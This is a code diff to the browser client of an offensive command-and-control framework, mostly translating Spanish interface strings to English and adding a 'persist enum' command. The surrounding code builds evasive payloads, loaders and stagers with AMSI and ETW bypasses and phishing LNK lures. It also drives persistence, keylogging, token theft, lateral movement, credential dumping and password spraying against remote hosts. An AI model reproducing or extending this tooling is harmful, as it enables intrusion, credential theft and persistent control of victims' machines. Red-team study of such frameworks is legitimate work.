@@ -995,10 +995,10 @@ input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
                     <select id="pay-inject"><option value="">Default</option><option value="fiber">Fiber</option><option value="callback">Callback</option><option value="ntthread">NtCreateThread</option></select>
                   </div>
                   <div class="form-row"><label>Sleep Mask</label>
-                    <select id="pay-sleepmask"><option value="none">Desactivado</option><option value="xor">XOR</option><option value="noaccess">PAGE_NOACCESS</option><option value="ekko">Ekko</option><option value="foliage">FOLIAGE</option></select>
+                    <select id="pay-sleepmask"><option value="none">Disabled</option><option value="xor">XOR</option><option value="noaccess">PAGE_NOACCESS</option><option value="ekko">Ekko</option><option value="foliage">FOLIAGE</option></select>
                   </div>
                   <div class="form-row"><label>AMSI Bypass</label>
-                    <select id="pay-amsimethod"><option value="none">Desactivado</option><option value="veh">Patchless VEH</option><option value="patch">Byte patch</option></select>
+                    <select id="pay-amsimethod"><option value="none">Disabled</option><option value="veh">Patchless VEH</option><option value="patch">Byte patch</option></select>
                   </div>
                   <div class="form-row"><label>ETW Bypass</label>
                     <input type="checkbox" id="pay-etwbypass" title="Parchear EtwEventWrite">
@@ -1452,7 +1452,7 @@ input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
                       <div class="form-row" style="margin:0">
                         <label>Sleep mask</label>
                         <select id="ldr-sleepmask" onchange="ldrSleepmaskChange(this)">
-                          <option value="">Desactivado</option>
+                          <option value="">Disabled</option>
                           <option value="xor">XOR</option>
                           <option value="noaccess">PAGE_NOACCESS ⚠</option>
                           <option value="ekko" selected>Ekko</option>
@@ -1463,7 +1463,7 @@ input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
                       <div class="form-row" style="margin:0">
                         <label>AMSI bypass</label>
                         <select id="ldr-amsi">
-                          <option value="">Desactivado</option>
+                          <option value="">Disabled</option>
                           <option value="veh" selected>Patchless VEH</option>
                           <option value="patch">Byte patch</option>
                         </select>
@@ -3910,7 +3910,7 @@ async function runCtxAction(act) {
       const os = String(agent?.os || '').toLowerCase();
       if (os && /(linux|darwin|freebsd|unix)/.test(os)) return '';
       const cmd = 'powershell.exe -NoLogo -NoProfile -NonInteractive -Command "$d=(Get-CimInstance Win32_ComputerSystem -ErrorAction SilentlyContinue).Domain; if ([string]::IsNullOrWhiteSpace($d)) {$d=$env:USERDNSDOMAIN}; $d"';
-      addConsoleOutputForAgent(agentID, '[*] Detectando el dominio AD del equipo…', '', null);
+      addConsoleOutputForAgent(agentID, '[*] Detecting AD domain of the machine…', '', null);
       try {
         const queued = await api('POST', `/api/agents/${agentID}/task`, {type:'SHELL', args:cmd});
         if (!queued?.ok || !queued.data?.task_id) return '';
@@ -5472,8 +5472,8 @@ async function checkClientVersion() {
     const kbd  = s => `<kbd style="background:rgba(0,0,0,.3);border:1px solid rgba(255,255,255,.3);padding:1px 6px;border-radius:3px;color:#fff">${esc(s)}</kbd>`;
     bar.innerHTML =
       `<span>⚠ New version available — commit ${code(d.current_commit)} ` +
-      `(este cliente: ${code(d.build_commit)}). ` +
-      `Ejecuta ${kbd('make client')} y reinicia c2-client.</span>` +
+      `(this client: ${code(d.build_commit)}). ` +
+      `Run ${kbd('make client')} and restart c2-client.</span>` +
       `<button id="eg-update-dismiss" style="margin-left:auto;background:none;border:1px solid rgba(255,255,255,.4);color:#fef3c7;cursor:pointer;border-radius:4px;padding:2px 10px;font-size:11px;flex-shrink:0">× Close</button>`;
     document.body.prepend(bar);
     document.getElementById('eg-update-dismiss').addEventListener('click', () => {
@@ -5610,10 +5610,10 @@ async function doLogin() {
   const newToken    = (document.getElementById('login-token').value  || '').trim();
   const newOperator = (document.getElementById('login-name').value   || '').trim() || 'operator';
 
-  if (!newToken) { doLogin.running = false; showLoginErr('Token requerido.'); return; }
-  if (!newBase)  { doLogin.running = false; showLoginErr('Server URL requerida.'); return; }
+  if (!newToken) { doLogin.running = false; showLoginErr('Token required.'); return; }
+  if (!newBase)  { doLogin.running = false; showLoginErr('Server URL required.'); return; }
 
-  showLoginErr('Conectando…');
+  showLoginErr('Connecting…');
   // Temporarily apply credentials so api() can use them; restore on failure
   const prevBASE = BASE, prevTOKEN = TOKEN;
   BASE = newBase; TOKEN = newToken;
@@ -6175,7 +6175,7 @@ async function pluginRefresh() {
       let actions = pluginActionButton('History', `pluginRuns('${id}')`);
       if (m.status === 'ready') {
         if (hasTab) {
-          actions = pluginActionButton('→ Abrir', `showTab('plugin-${m.id}')`) + ' ' + actions;
+          actions = pluginActionButton('→ Open', `showTab('plugin-${m.id}')`) + ' ' + actions;
         } else if (m.type !== 'ui') {
           actions = pluginActionButton('▶ Run', `pluginRun('${id}')`) + ' ' + actions;
         }
@@ -6763,7 +6763,7 @@ async function marketplaceRefresh() {
   if (!listEl) return;
 
   if (!plugins.length) {
-    listEl.innerHTML = '<div style="padding:14px;color:var(--text3);font-size:12px">No hay plugins en el marketplace.</div>';
+    listEl.innerHTML = '<div style="padding:14px;color:var(--text3);font-size:12px">No plugins in the marketplace.</div>';
     return;
   }
 
@@ -6777,7 +6777,7 @@ async function marketplaceRefresh() {
         ? `<div style="font-size:10px;color:var(--text3);margin-top:4px">requires: <code>${p.requires.map(esc).join(', ')}</code></div>`
         : '';
       const statusBadge = installed
-        ? `<span style="color:var(--green);font-size:11px">● instalado</span>`
+        ? `<span style="color:var(--green);font-size:11px">● installed</span>`
         : '';
       const actionBtn = installed
         ? `<button class="btn btn-ghost btn-sm" onclick="marketplaceUninstall('${esc(p.id)}',this)" style="color:var(--red)">🗑 Uninstall</button>`
@@ -9314,6 +9314,7 @@ const AC_COMMANDS = [
   ['persist','persist run-key — HKCU Run registry'],
   ['persist task','persist task [name] — scheduled task'],
   ['persist rm','persist rm — remove persistence'],
+  ['persist enum','persist enum — list installed persistence (Run keys, schtasks, WMI, services)'],
   // INTERACTIVE SHELL
   ['ishell','ishell cmd|ps — open persistent interactive shell'],
   ['ishell cmd','ishell cmd — open interactive cmd.exe'],
@@ -9420,7 +9421,7 @@ const AC_WIN_ONLY = new Set([
   'make-token','steal-token','rev2self','getsystem',
   'keylog','keylog start','keylog stop','keylog dump',
   'clip','minidump',
-  'persist','persist task','persist rm',
+  'persist','persist task','persist rm','persist enum',
   'ishell','ishell cmd','ishell ps','ishell exit',
   'link start','link stop',
   'winrm exec','winrm deploy',
@@ -9890,6 +9891,7 @@ ${isWin ? `
   persist                            persistence via HKCU\\Run
   persist task [name]                persistence via onlogon scheduled task
   persist rm                         remove active persistence
+  persist enum                       enumerate installed persistence (Run keys, schtasks, WMI, services)
   com-hijack &lt;clsid&gt; &lt;dll&gt;         COM key hijacking in HKCU (no elevation required)
   com-hijack rm &lt;clsid&gt;             remove COM hijack
   gen-lnk &lt;target&gt; [args] [icon]    generate .lnk file (LNK phishing / autorun)
@@ -9902,7 +9904,7 @@ ${isWin ? `
   jump atexec  &lt;host&gt; &lt;payload.exe&gt; [user] [pass]   lateral via ephemeral scheduled task (AT)
   jump ssh     &lt;host&gt; &lt;payload.bin&gt; [user] [pass]   copy + execute via SSH (Linux/Windows)
   jump winrm   &lt;host&gt; &lt;payload.exe&gt; [user] [pass]   copy payload.exe to target and execute via WinRM
-  jump runas   &lt;host&gt; &lt;payload.exe&gt; &lt;user&gt; &lt;pass&gt;   schtasks privesc — ejecuta como usuario local (mismo host)
+  jump runas   &lt;host&gt; &lt;payload.exe&gt; &lt;user&gt; &lt;pass&gt;   schtasks privesc — execute as local user (same host)
                                                      (≠ winrm deploy: payload is a pre-uploaded .exe)
   winrm exec   &lt;host&gt; &lt;user&gt; &lt;pass&gt; &lt;cmd&gt;          run a single command on remote host via WinRM
                                                      (no agent deployed — equivalent to wmiexec over WinRM)
@@ -10539,16 +10541,19 @@ ${isWin ? `  • Useful for finding target PIDs for inject/inject-apc/token stea
   persist run-key              → HKCU\\Run registry key
   persist task [name]          → OnLogon scheduled task
   persist rm                   → remove active persistence
+  persist enum                 → enumerate installed persistence
 
   <span class="console-section">EXAMPLES</span>
   persist run-key              → agent runs on user login
   persist task WindowsUpdate   → 'WindowsUpdate' task executes the agent
   persist rm                   → removes established persistence
+  persist enum                 → lists Run keys, schtasks, WMI, services, COM
 
   <span class="console-section">NOTES</span>
   • run-key writes to HKCU (no admin privileges required)
   • persist task requires agent to be on disk with accessible path
-  • Go/Nim agents; Linux uses systemd or cron`,
+  • Go/Nim agents; Linux uses systemd or cron
+  • persist enum works on all agent types (Go, C, Nim, Rust)`,
 
   'socks': `<b>socks</b> — start SOCKS5 proxy on agent (Go agent)
 
@@ -11746,7 +11751,7 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
       const edFile  = edparts[0] || '';
       const edArgs  = edparts.slice(1).join(' ');
       if (!edFile) { addConsoleOutput('usage: dotnet-exec <asm.exe> [args]', '', null); return; }
-      addConsoleOutput(`[*] dotnet-exec: cargando ${edFile}…`, '', null);
+      addConsoleOutput(`[*] dotnet-exec: loading ${edFile}…`, '', null);
       try {
         const asmBytes = await fetchSCFile(edFile);
         const b64 = u8ToB64(new Uint8Array(asmBytes));
@@ -11756,7 +11761,7 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
           timeout_sec: longRunning ? 900 : 0});
         if (longRunning) {
           taskPollTimeoutMs = 930000;
-          addConsoleOutput('[~] SharpHound puede tardar varios minutos; la tarea sigue activa mientras enumera LDAP…', '', null);
+          addConsoleOutput('[~] SharpHound may take several minutes; the task remains active while enumerating LDAP…', '', null);
         }
         addConsoleOutput(`[+] ${edFile}: ${asmBytes.byteLength} bytes → DOTNET_EXEC`, '', null);
       } catch(e) { addConsoleOutput('', 'dotnet-exec error: '+e.message, null); return; }
@@ -12268,13 +12273,13 @@ function removeSelectedAgents() {
     agents = agents.filter(a => !ids.includes(a.id));
     selectedAgentIds.clear();
     renderAgents();
-    toast(`${ids.length} agente(s) eliminado(s)`);
+    toast(`${ids.length} agent(s) deleted`);
   });
 }
 
 function purgeDeadAgents() {
   const deadIds = agents.filter(a => agentStatus(a).color === 'gray').map(a => a.id);
-  if (!deadIds.length) { toast('No hay agentes muertos', 'yellow'); return; }
+  if (!deadIds.length) { toast('No dead agents', 'yellow'); return; }
   showConfirm('Purge dead agents', `Delete ${deadIds.length} dead agent(s) from the database?`, async () => {
     let removed = 0;
     for (const id of deadIds) {
@@ -12284,7 +12289,7 @@ function purgeDeadAgents() {
     agents = agents.filter(a => !deadIds.includes(a.id));
     selectedAgentIds.clear();
     renderAgents();
-    toast(`${removed} agente(s) muerto(s) eliminado(s)`);
+    toast(`${removed} dead agent(s) deleted`);
   });
 }
 
@@ -12527,7 +12532,7 @@ function toggleDlvTunnel() {
 function dlvUseTunnel() {
   const url = stagerState?.public_url;
   const el  = document.getElementById('dlv-stageurl2');
-  if (url && el) { el.value = url; toast('URL copiada al campo', 'green'); }
+  if (url && el) { el.value = url; toast('URL copied to field', 'green'); }
 }
 
 function dlvUpdateTunnelBanner() {
@@ -12546,7 +12551,7 @@ async function dlvLaunchTunnel(provider) {
   const body = {provider};
   if (provider === 'manual') {
     let url = (document.getElementById('dlv-manual-url')?.value || '').trim();
-    if (!url) { toast('Introduce una URL manual', 'error'); return; }
+    if (!url) { toast('Enter a manual URL', 'error'); return; }
     if (!/^https?:\/\//i.test(url)) {
       const port = stagerState?.port || 7777;
       url = 'http://' + url + ':' + port;
@@ -12622,7 +12627,7 @@ async function unifiedBuild() {
     await buildPayload();
 
   } else if (_payMode === 'loader') {
-    if (!host) { toast('C2 Host requerido', 'red'); return; }
+    if (!host) { toast('C2 Host required', 'red'); return; }
     const fmt    = _loaderFmt;
     const garble = document.getElementById('ldr-garble2').checked;
     const arch   = document.getElementById('ldr-arch2').value;
@@ -12639,7 +12644,7 @@ async function unifiedBuild() {
     const fmt      = document.getElementById('dlv-fmt2').value;
     const stageURL = document.getElementById('dlv-stageurl2').value.trim();
     const lure     = document.getElementById('dlv-lurename2').value.trim();
-    if (!stageURL && fmt !== 'html') { toast('Stage URL requerida para este formato', 'red'); return; }
+    if (!stageURL && fmt !== 'html') { toast('Stage URL required for this format', 'red'); return; }
     document.getElementById('pay-format').value = fmt;
     if (document.getElementById('pay-stage'))
       document.getElementById('pay-stage').value = stageURL;
@@ -12665,8 +12670,8 @@ async function unifiedBuild() {
 
   } else if (_payMode === 'stager') {
     const stageURL = document.getElementById('stager-stage-url').value.trim();
-    if (!stageURL) { toast('Stage URL requerida', 'red'); return; }
-    res.innerHTML = '<div class="result-card" style="color:var(--yellow)">Compilando stager C… (~10s)</div>';
+    if (!stageURL) { toast('Stage URL required', 'red'); return; }
+    res.innerHTML = '<div class="result-card" style="color:var(--yellow)">Compiling C stager… (~10s)</div>';
     const r = await api('POST', '/api/build/stager', { stage_url: stageURL }, true);
     if (!r.ok) {
       let msg = r.statusText || 'Error';
@@ -12678,17 +12683,17 @@ async function unifiedBuild() {
       const blobURL = URL.createObjectURL(await r.blob());
       const fname   = 'stager.exe';
       res.innerHTML = `<div style="background:rgba(83,130,255,.08);border:1px solid var(--accent);border-radius:6px;padding:10px 12px">
-        <div style="font-size:10px;font-weight:700;color:var(--accent);margin-bottom:8px">Stager listo</div>
+        <div style="font-size:10px;font-weight:700;color:var(--accent);margin-bottom:8px">Stager ready</div>
         <div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;margin-bottom:8px">
           <code style="font-size:11px;color:var(--text);word-break:break-all;flex:1">${esc(fname)}</code>
           <a href="${blobURL}" download="${esc(fname)}" class="btn btn-ghost btn-sm" style="white-space:nowrap">⬇ Download</a>
         </div>
         <div style="font-size:10px;color:var(--text3);line-height:1.6">
-          Lenguaje: C (WinHTTP, sin CRT) · ~17 KB<br>
-          Stage URL embebida: <code style="color:var(--text2)">${esc(stageURL)}</code>
+          Language: C (WinHTTP, no CRT) · ~17 KB<br>
+          Embedded Stage URL: <code style="color:var(--text2)">${esc(stageURL)}</code>
         </div>
       </div>`;
-      toast('Stager compilado', 'green');
+      toast('Stager compiled', 'green');
     }
   }
 }
@@ -12855,7 +12860,7 @@ function ldrFillURL() {
 
 async function buildLoader() {
   const stageURL = (document.getElementById('ldr-url').value || '').trim();
-  if (!stageURL) { toast('C2 HTTP URL requerida', 'red'); return; }
+  if (!stageURL) { toast('C2 HTTP URL required', 'red'); return; }
 
   const loaderFmt = document.getElementById('ldr-type').value;
   const garble    = document.getElementById('ldr-garble').checked;
@@ -13121,7 +13126,7 @@ function pslGenerate() {
   const payloadURL = document.getElementById('psl-payload-url').value.trim();
   const scriptHost = document.getElementById('psl-script-host').value.trim().replace(/\/$/, '');
   const scriptName = document.getElementById('psl-script-name').value.trim() || 'loader.ps1';
-  if (!payloadURL) { toast('Introduce la URL del payload .bin', 'error'); return; }
+  if (!payloadURL) { toast('Enter the .bin payload URL', 'error'); return; }
   if (!scriptHost) { toast('Enter the base URL where you will host the .ps1', 'error'); return; }
 
   const scriptContent = PSL_TEMPLATE.replace('%%PAYLOAD_URL%%', payloadURL);
@@ -13404,10 +13409,10 @@ async function dlvBuild() {
   const isoLabel = document.getElementById('dlv-isolabel').value.trim() || 'Documents';
   const resultEl = document.getElementById('dlv-result');
 
-  if (!artifact) { resultEl.innerHTML = '<span style="color:var(--red)">Selecciona un artifact primero.</span>'; return; }
-  if (wrapper !== 'html' && !stageURL) { resultEl.innerHTML = '<span style="color:var(--red)">Stage URL requerida.</span>'; return; }
+  if (!artifact) { resultEl.innerHTML = '<span style="color:var(--red)">Select an artifact first.</span>'; return; }
+  if (wrapper !== 'html' && !stageURL) { resultEl.innerHTML = '<span style="color:var(--red)">Stage URL required.</span>'; return; }
 
-  resultEl.innerHTML = '<span style="color:var(--text3)">Generando…</span>';
+  resultEl.innerHTML = '<span style="color:var(--text3)">Generating…</span>';
 
   const body = { wrapper, artifact, lure_name: lureName, stage_url: stageURL, iso_label: isoLabel, stage_max_dl: parseInt(document.getElementById('dlv-stagemaxdl')?.value)||0 };
   try {
@@ -13454,7 +13459,7 @@ async function cleanPayloads(dir) {
     try {
       if (dir === 'payloads') {
         const r = await api('GET', '/api/artifacts');
-        if (!r?.ok) throw new Error(r?.error || 'No se pudieron cargar los payloads');
+        if (!r?.ok) throw new Error(r?.error || 'Failed to load payloads');
         for (const file of (Array.isArray(r.data) ? r.data : [])) {
           const deleted = await api('DELETE', '/api/artifacts/' + encodeURIComponent(file.filename));
           if (!deleted?.ok) throw new Error(deleted?.error || `Failed to delete ${file.filename}`);
@@ -13516,9 +13521,9 @@ function stagerFillFromTunnel() {
   if (host) {
     const scheme = (transport === 'mtls' || transport === 'https' || transport === 'tcp') ? 'https' : 'http';
     el.value = `${scheme}://${host}:${port}/stage/TOKEN`;
-    toast('Stage URL pre-filled — sustituye TOKEN por el token real', 'yellow');
+    toast('Stage URL pre-filled — replace TOKEN with the real token', 'yellow');
   } else {
-    toast('No hay tunnel activo ni host configurado — rellena el Host y pulsa ↙', 'error');
+    toast('No active tunnel or host configured — fill in the Host and click ↙', 'error');
   }
 }
 
@@ -13624,14 +13629,14 @@ async function buildPayload() {
   }
 
   const _slowLangs = {rust: 'Rust', c: 'C', nim: 'Nim'};
-  const _langHint  = _slowLangs[body.lang] ? ` (${_slowLangs[body.lang]} puede tardar 1-2 min)` : '';
+  const _langHint  = _slowLangs[body.lang] ? ` (${_slowLangs[body.lang]} may take 1-2 min)` : '';
   res.innerHTML = `<div class="result-card" style="color:var(--yellow)">⚙ Building…${_langHint}</div>`;
   try {
     const r = await api('POST', '/api/build', body);
     if (r.ok) {
       renderBuildResult(res, r.data);
       const stageURL = r.data?.bin_stage;
-      if (stageURL) { copyText(stageURL); toast('✓ Build OK — Stage URL copiada al portapapeles', 'green'); }
+      if (stageURL) { copyText(stageURL); toast('✓ Build OK — Stage URL copied to clipboard', 'green'); }
       else toast('Payload built!');
     } else {
       res.innerHTML = `<div class="result-card" style="color:var(--red)">✗ ${esc(r.error||'Build failed')}</div>`;
@@ -13689,7 +13694,7 @@ async function buildPayloadStream(res, body) {
             if (evt.type === 'done') {
               renderBuildResult(res, evt.result);
               const stageURL = evt.result?.bin_stage;
-              if (stageURL) { copyText(stageURL); toast('✓ Build OK — Stage URL copiada al portapapeles', 'green'); }
+              if (stageURL) { copyText(stageURL); toast('✓ Build OK — Stage URL copied to clipboard', 'green'); }
               else toast('Payload built!');
             } else if (evt.type === 'error') {
               res.innerHTML = `<div class="result-card" style="color:var(--red)">✗ ${esc(evt.message||'Build failed')}</div>`;
@@ -13769,7 +13774,7 @@ function renderBuildResult(container, data) {
       </div>
       <div style="display:flex;gap:4px;flex-shrink:0">
         ${isURL
-          ? `<button class="btn btn-${isStage?'primary':'ghost'} btn-sm" onclick="copyText('${val.replace(/'/g,"\\'")}')">⎘ Copiar</button>`
+          ? `<button class="btn btn-${isStage?'primary':'ghost'} btn-sm" onclick="copyText('${val.replace(/'/g,"\\'")}')">⎘ Copy</button>`
           : `<a class="btn btn-ghost btn-sm" href="${BASE}/api/artifacts/${encodeURIComponent(filename)}?token=${TOKEN}" download="${esc(filename)}">⬇ Download</a>
              <button class="btn btn-ghost btn-sm" onclick="payStageFile('${val.replace(/'/g,"\\'")}','${filename.replace(/'/g,"\\'")}')">→ Stage</button>`
         }
@@ -14119,7 +14124,7 @@ async function credDelSelected() {
       const r = await api('DELETE', `/api/creds/${id}`);
       if (r?.ok) ok++;
     }
-    toast(`${ok} credencial${ok>1?'es':''} eliminada${ok>1?'s':''}`, 'yellow');
+    toast(`${ok} credential${ok>1?'s':''} deleted`, 'yellow');
     loadCreds();
   });
 }
@@ -14132,7 +14137,7 @@ async function credDelAll() {
       const r = await api('DELETE', `/api/creds/${c.id}`);
       if (r?.ok) ok++;
     }
-    toast(`${ok} credenciales eliminadas`, 'yellow');
+    toast(`${ok} credentials deleted`, 'yellow');
     loadCreds();
   });
 }
@@ -14206,7 +14211,7 @@ async function addCred() { await credSave(); }
 async function delCred(id) {
   showConfirm('Delete credential', `Delete credential #${id}?`, async () => {
     const r = await api('DELETE', `/api/creds/${id}`);
-    if (r.ok) { toast('Credencial eliminada', 'yellow'); loadCreds(); }
+    if (r.ok) { toast('Credential deleted', 'yellow'); loadCreds(); }
     else toast('Error: ' + r.error, 'red');
   });
 }
@@ -14217,7 +14222,7 @@ async function delUpload(agentId, filename) {
     : encodeURIComponent(filename);
   showConfirm('Delete file', `Delete "${filename}"?`, async () => {
     const r = await api('DELETE', `/api/dl/${path}`);
-    if (r?.ok) { toast('Archivo eliminado', 'yellow'); loadDownloads(); loadScreenshots(); }
+    if (r?.ok) { toast('File deleted', 'yellow'); loadDownloads(); loadScreenshots(); }
     else toast('Error: ' + (r?.error || 'unknown'), 'red');
   });
 }
@@ -15993,7 +15998,7 @@ async function fxShowPayloadPicker() {
   _fxPayloadAll.sort((a,b) => (b.date||'').localeCompare(a.date||''));
 
   if (!_fxPayloadAll.length) {
-    listEl.innerHTML = '<div style="color:var(--text3);font-size:12px;padding:8px">No hay payloads en el servidor.</div>';
+    listEl.innerHTML = '<div style="color:var(--text3);font-size:12px;padding:8px">No payloads on the server.</div>';
     return;
   }
 
@@ -16098,7 +16103,7 @@ async function openInjectModal(agentId, mode, pid) {
   try {
     [ra, ru] = await Promise.all([api('GET','/api/artifacts'), api('GET','/api/uploads')]);
   } catch(e) {
-    listEl.innerHTML = `<div style="color:var(--red);font-size:12px;padding:8px">Error cargando payloads: ${esc(String(e))}</div>`;
+    listEl.innerHTML = `<div style="color:var(--red);font-size:12px;padding:8px">Error loading payloads: ${esc(String(e))}</div>`;
     return;
   }
   const all = [
@@ -16477,7 +16482,7 @@ function stagerDeleteSelected() {
       const r = await api('DELETE', '/api/stager/files/'+t);
       if (r?.ok) ok++; else fail++;
     }
-    toast(`${ok} eliminado(s)${fail ? ', '+fail+' fallaron' : ''}`, fail ? 'error' : 'green');
+    toast(`${ok} deleted${fail ? ', '+fail+' failed' : ''}`, fail ? 'error' : 'green');
     refreshStager();
   });
 }
@@ -17681,7 +17686,7 @@ function opShowWelcome() {
     ['var(--text)',    '  nmap -sV -p 445,88,5985,3389 10.2.20.100 -T4'],
     ['var(--text)',    '  kerbrute userenum -d cs.org --dc 10.2.20.100 users.txt'],
     ['var(--text3)',   ''],
-    ['var(--text3)',   '! prefijo = forzar shell sin modificar   Ctrl+C = interrumpir'],
+    ['var(--text3)',   '! prefix = force shell without modification   Ctrl+C = interrupt'],
     ['var(--text3)',   ''],
     ['var(--text2)',   'Variables (persist between commands):'],
     ['var(--text)',    '  TARGET=10.10.10.10          # set variable'],
@@ -17759,7 +17764,7 @@ async function aiLoadModels() {
     if (!models.includes(sel.value)) sel.value = models[0];
     aiSavePrefs();
   } catch(e) {
-    sel.innerHTML = '<option value="">Error — Ollama no disponible</option>';
+    sel.innerHTML = '<option value="">Error — Ollama not available</option>';
     toast('Ollama: ' + e.message, 'error');
   }
 }
@@ -17813,7 +17818,7 @@ async function aiSend() {
     model      = (document.getElementById('ai-claude-model').value || 'claude-sonnet-4-6').trim();
     api_key    = (document.getElementById('ai-claude-key').value || localStorage.getItem('ai_claude_key') || '').trim();
     ollama_url = '';
-    if (!api_key) { toast('Introduce la Anthropic API key en la toolbar', 'error'); return; }
+    if (!api_key) { toast('Enter the Anthropic API key in the toolbar', 'error'); return; }
   } else if (provider === 'claude-code') {
     model      = (document.getElementById('ai-claude-code-model').value || 'claude-haiku-4-5-20251001').trim();
     api_key    = '';
@@ -18138,9 +18143,9 @@ function aiProviderChanged(){
 }
 function aiSaveClaudeKey(){
   const key=(document.getElementById('ai-claude-key').value||'').trim();
-  if(!key){toast('Introduce la API key primero','warn');return;}
+  if(!key){toast('Enter the API key first','warn');return;}
   localStorage.setItem('ai_claude_key',key);
-  toast('API key guardada en localStorage','green');
+  toast('API key saved to localStorage','green');
 }
 // Check Claude Code OAuth availability and update status badge
 async function aiCheckClaudeCode(){
@@ -18152,7 +18157,7 @@ async function aiCheckClaudeCode(){
       badge.textContent='⚡ OAuth active';
       badge.style.color='#5af78e';
     } else {
-      badge.textContent='✗ Sin auth — ejecuta: claude login';
+      badge.textContent='✗ No auth — run: claude login';
       badge.style.color='#f38ba8';
     }
   }catch(_){}
@@ -18203,7 +18208,7 @@ function aiStart(){
   if(provider==='claude'){
     model=(document.getElementById('ai-claude-model').value||'claude-sonnet-4-6').trim();
     api_key=(document.getElementById('ai-claude-key').value||localStorage.getItem('ai_claude_key')||'').trim();
-    if(!api_key){alert('Introduce la Anthropic API key en la toolbar');return;}
+    if(!api_key){alert('Enter the Anthropic API key in the toolbar');return;}
   } else if(provider==='claude-code'){
     model=(document.getElementById('ai-claude-code-model').value||'claude-haiku-4-5-20251001').trim();
     api_key=''; // backend loads OAuth token from ~/.claude/.credentials.json
@@ -18456,7 +18461,7 @@ async function aicCheckClaudeCode() {
       badge.textContent = '⚡ OAuth active';
       badge.style.color = '#5af78e';
     } else {
-      badge.textContent = '✗ Sin auth — ejecuta: claude login';
+      badge.textContent = '✗ No auth — run: claude login';
       badge.style.color = '#f38ba8';
     }
   } catch(_) {}
@@ -19093,7 +19098,7 @@ async function deleteProfile(name) {
 
 async function importProfileFromURL() {
   const rawUrl = (document.getElementById('profile-import-url').value || '').trim();
-  if (!rawUrl) { toast('Introduce una URL primero', 'yellow'); return; }
+  if (!rawUrl) { toast('Enter a URL first', 'yellow'); return; }
   const nameEl = document.getElementById('profile-import-name');
   const btn = document.getElementById('btn-profile-import-url');
   if (btn) { btn.disabled = true; btn.textContent = '…'; }
@@ -19108,7 +19113,7 @@ async function importProfileFromURL() {
     }
     document.getElementById('profile-import-text').value = fr.data.text;
     const sr = await api('POST', '/api/profiles', { name, source: rawUrl, raw_text: fr.data.text });
-    if (!sr || !sr.ok) throw new Error(sr?.error || 'Error guardando el perfil');
+    if (!sr || !sr.ok) throw new Error(sr?.error || 'Error saving the profile');
     toast('Perfil importado: ' + name, 'blue');
     closeModal('modal-profile-import');
     nameEl.value = '';
@@ -19264,7 +19269,7 @@ async function ipcLoadArtifacts() {
     const r = await api('GET', '/api/artifacts');
     if (!r.ok) return;
     const cur = sel.value;
-    sel.innerHTML = '<option value="">— seleccionar payload —</option>';
+    sel.innerHTML = '<option value="">— select payload —</option>';
     (r.data || [])
       .filter(f => /\.(exe|bin|dll|elf)$/i.test(f.filename) || !f.filename.includes('.'))
       .sort((a, b) => b.created_at.localeCompare(a.created_at))
@@ -19375,10 +19380,10 @@ async function ipcStream(cmd, outEl, onDone, lineFilter) {
 
 async function ipcValidate(proto) {
   const a = ipcAuth();
-  if (!a.target || !a.user) { toast('Target y usuario requeridos', 'error'); return; }
+  if (!a.target || !a.user) { toast('Target and user required', 'error'); return; }
   const outEl = document.getElementById('ipc-validate-out');
   const badge = document.getElementById('ipc-validate-badge');
-  badge.textContent = 'verificando...';
+  badge.textContent = 'verifying...';
   badge.style.color = 'var(--text3)';
   const cmd = `netexec ${proto} ${a.target} ${a.nxe}`;
   await ipcStream(cmd, outEl, (code, text) => {
@@ -19386,7 +19391,7 @@ async function ipcValidate(proto) {
     const access = text.includes('[+]');
     badge.innerHTML = access
       ? `<span style="color:var(--green)">${admin ? '★ ADMIN' : '✓ Access'}</span>`
-      : `<span style="color:var(--red)">✗ Sin acceso</span>`;
+      : `<span style="color:var(--red)">✗ No access</span>`;
   });
 }
 
@@ -19405,7 +19410,7 @@ async function ipcSweep() {
   const a    = ipcAuth();
   const cidr = document.getElementById('ipc-sweep-cidr').value.trim();
   const proto = document.getElementById('ipc-sweep-proto').value;
-  if (!cidr) { toast('Introduce el rango de red', 'error'); return; }
+  if (!cidr) { toast('Enter the network range', 'error'); return; }
   const tbody = document.getElementById('ipc-sweep-tbody');
   tbody.innerHTML = '<tr><td colspan="5" style="text-align:center;color:var(--text3);padding:8px">Escaneando...</td></tr>';
   const nxeAuth = a.user ? ' ' + a.nxe : '';
@@ -19440,7 +19445,7 @@ function ipcParseSweep(text, tbody) {
 
 async function ipcDump() {
   const a = ipcAuth();
-  if (!a.target || !a.user) { toast('Target y usuario requeridos', 'error'); return; }
+  if (!a.target || !a.user) { toast('Target and user required', 'error'); return; }
   const method  = document.getElementById('ipc-dump-method').value;
   const outEl   = document.getElementById('ipc-dump-out');
   const savedEl = document.getElementById('ipc-dump-saved');
@@ -19461,7 +19466,7 @@ async function ipcDump() {
     }
     if (saved) { renderCreds(); renderIpcCredSelect(); }
     savedEl.innerHTML = saved
-      ? `<span style="color:var(--green)">✓ ${saved} credential(s) guardadas en Loot</span>`
+      ? `<span style="color:var(--green)">✓ ${saved} credential(s) saved to Loot</span>`
       : `<span style="color:var(--text3)">No se encontraron hashes en la salida</span>`;
   });
 }
@@ -19483,7 +19488,7 @@ function ipcParseSecretsdump(text, host) {
 
 async function ipcEnum(type) {
   const a = ipcAuth();
-  if (!a.target || !a.user) { toast('Target y usuario requeridos', 'error'); return; }
+  if (!a.target || !a.user) { toast('Target and user required', 'error'); return; }
   const outEl = document.getElementById('ipc-enum-out');
   const cmds = {
     'shares':          `netexec smb ${a.target} ${a.nxe} --shares`,
@@ -19509,7 +19514,7 @@ async function ipcSpray() {
   const usersRaw  = document.getElementById('ipc-spray-users').value.trim();
   const sprayPass = document.getElementById('ipc-spray-pass').value.trim();
   const proto     = document.getElementById('ipc-spray-proto').value;
-  if (!a.target || !usersRaw || !sprayPass) { toast('Target, usuarios y password requeridos', 'error'); return; }
+  if (!a.target || !usersRaw || !sprayPass) { toast('Target, users and password required', 'error'); return; }
   const outEl  = document.getElementById('ipc-spray-out');
   const hitsEl = document.getElementById('ipc-spray-hits');
   hitsEl.textContent = 'Spraying...';
@@ -19540,7 +19545,7 @@ function renderIpcCredSelect() {
   const sel = document.getElementById('ipc-cred-select');
   if (!sel) return;
   const cur = sel.value;
-  sel.innerHTML = '<option value="">— seleccionar credencial —</option>';
